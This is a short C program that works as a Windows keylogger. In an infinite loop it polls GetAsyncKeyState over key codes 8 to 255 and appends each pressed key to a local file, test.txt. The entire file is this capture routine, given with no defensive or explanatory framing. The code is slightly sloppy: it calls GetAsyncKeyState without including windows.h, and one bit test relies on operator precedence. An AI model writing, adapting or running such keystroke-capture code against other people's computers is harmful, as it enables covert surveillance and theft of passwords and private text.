#include <stdio.h>

void writeInFile(char my_char){
    FILE *f;
    f = fopen("./test.txt", "a");
    if(f == NULL)
        printf("File did not open");
    else{
        fprintf(f, "%c", my_char);
        fclose(f);
    }
}

void gettingKeys(){

    while(1){
        for(int i = 8; i < 256; i ++){ //ascii codes that i need
            if(GetAsyncKeyState(i) & 0x01 > 0){ //lsb > 0 (avoiding print multiple times if char is pressed only once)
                // printf("%c", (char)i);
                char my_char = (char)i;
                writeInFile(my_char);

            }
    }

    }


}

int main() {
    gettingKeys();

}